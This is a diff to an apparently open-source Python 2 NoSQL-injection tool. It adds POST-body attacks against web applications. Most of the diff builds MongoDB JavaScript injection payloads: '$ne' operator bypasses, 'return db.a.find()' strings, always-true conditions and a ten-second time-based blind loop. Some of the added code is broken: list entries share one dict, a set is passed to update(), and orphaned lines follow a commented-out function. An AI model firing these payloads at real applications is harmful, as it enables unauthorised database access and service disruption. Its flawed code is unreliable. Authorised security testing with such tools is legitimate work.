@@ -28,6 +28,7 @@ import json
 import gridfs
 import ipcalc
 import signal
+import ast
 from hashlib import md5
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
@@ -491,7 +492,7 @@ def netAttacks(target):
 		
 
 def postApps():
-	print "Web App Attacks"
+	print "Web App Attacks (POST)"
 	print "==============="
 	paramName = []
 	paramValue = []
@@ -547,9 +548,12 @@ def postApps():
 		
 		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
 		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
-		randomUri = buildUri(appURL,injectString)
-		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
-		randLength = int(len(urllib.urlopen(randomUri).read()))
+		randomPost = buildPostData(postData,injectString)
+		print "Checking random injected parameter HTTP response size sending " + str(randomPost) +"...\n"
+		
+		body = urllib.urlencode(randomPost)
+		req = urllib2.Request(appURL,body)
+		randLength = int(len(urllib.urlopen(req).read()))
 		print "Got response length of " + str(randLength) + "."
 		
 		randNormDelta = abs(normLength - randLength)
@@ -816,7 +820,7 @@ def postApps():
 	return()	
 	
 def webApps():
-	print "Web App Attacks"
+	print "Web App Attacks (GET)"
 	print "==============="
 	paramName = []
 	paramValue = []
@@ -1133,14 +1137,12 @@ def webApps():
 	raw_input("Press enter to continue...")
 	return()
 
-def webDBAttacks(trueLen):
-	nameLen = 0
-	injTestLen = 0
-	getDBName = raw_input("Get database name (y/n)? ")
-	
-	if getDBName == "y" or getDBName == "Y":
-		while injTestLen != trueLen:
-			testUri = uriArray[16].split("---")
+#def webDBAttacks(trueLen):
+#	injTestLen = 0
+#	getDBName = raw_input("Get database name (y/n)? ")
+#	if getDBName == "y" or getDBName == "Y":
+#		while injTestLen != trueLen:
+#			testUri = uriArray[16].split("---")
 			
 	
 
@@ -1241,7 +1243,7 @@ def buildUri(origUri, randValue):
 			uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
 			uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
 			uriArray[4] += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
-			uriArray[5] += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
+			uriArray[5] += paramName[x] + "=1; return db.a.findOne(); var dummy=1" + "&"
 			uriArray[6] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
 			uriArray[7] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
 			uriArray[8] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
@@ -1278,29 +1280,16 @@ def buildUri(origUri, randValue):
 		x += 1
 		
 	#Clip the extra & off the end of the URL
-	uriArray[0]= uriArray[0][:-1]
-	uriArray[1] = uriArray[1][:-1]
-	uriArray[2] = uriArray[2][:-1]
-	uriArray[3] = uriArray[3][:-1]
-	uriArray[4] = uriArray[4][:-1]
-	uriArray[5] = uriArray[5][:-1]
-	uriArray[6] = uriArray[6][:-1]
-	uriArray[7] = uriArray[7][:-1]
-	uriArray[8] = uriArray[8][:-1]
-	uriArray[9] = uriArray[9][:-1]
-	uriArray[10] = uriArray[10][:-1]
-	uriArray[11] = uriArray[11][:-1]
-	uriArray[12] = uriArray[12][:-1]
-	uriArray[13] = uriArray[13][:-1]
-	uriArray[14] = uriArray[14][:-1]
-	uriArray[15] = uriArray[15][:-1]
-	uriArray[16] = uriArray[16][:-1]
-	uriArray[17] = uriArray[17][:-1]
+	x = 0
+	while x <= 17:
+		uriArray[x]= uriArray[x][:-1]
+		x += 1
+
 	return uriArray[0]
 
-def buildPostData(body):
-	global bodyArray
-	bodyArray = ["","","","","","","","","","","","","","","","","",""]
+def buildPostData(body,randValue):
+	global bodyList
+	bodyList = []
 	injOpt = ""
 	
 	#Split the string between the path and parameters, and then split each parameter
@@ -1319,6 +1308,41 @@ def buildPostData(body):
 	except:
 		raw_input("Something went wrong.  Press enter to return to the main menu...")
 		mainMenu()
+	x = 0
+	while x <= 18:
+		bodyList.append(body)
+		x += 1
+	
+	bodyList[0].update({injOpt,randValue})
+	#gotta change the key name to include the not equals
+	tempStr = str(bodyList[1])
+	tempStr = tempStr.replace(injOpt, injOpt + "[$ne]")
+	tempDict = ast.literal_eval(tempStr)
+	del bodyList[1]
+	bodyList.insert(1, tempDict)
+	bodyList[2].update({injOpt : "a'; return db.a.find(); var dummy='!"})
+	bodyList[3].update({injOpt : "=1; return db.a.find(); var dummy=1"})
+	bodyList[4].update({injOpt : "=a'; return db.a.findOne(); var dummy='!"})
+	bodyList[5].update({injOpt : "=1; return db.a.findOne(); var dummy=1"})
+	bodyList[6].update({injOpt : "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!"})
+	bodyList[7].update({injOpt : "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"})
+	bodyList[8].update({injOpt : "=a'; return this.a != '" + randValue + "'; var dummy='!"})
+	bodyList[9].update({injOpt : "=1; return this.a !=" + randValue + "; var dummy=1"})
+	bodyList[10].update({injOpt : "=a\"; return db.a.find(); var dummy=\"!"})
+	bodyList[11].update({injOpt : "=a\"; return this.a != '" + randValue + "'; var dummy=\"!"})
+	bodyList[12].update({injOpt :"=a\"; return db.a.findOne(); var dummy=\"!"})
+	bodyList[13].update({injOpt : "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!"}  )
+	bodyList[14].update({injOpt : "a'; return true; var dum=a"})
+	bodyList[15].update({injOpt : "1; return true; var dum=2"})
+	bodyList[16].update({injOpt : "=a\'; ---"})
+	bodyList[17].update({injOpt : "=1; ---"})
+	
+	return bodyList[0]
+	
+	
+	
+		
+	
 	
 	
 	
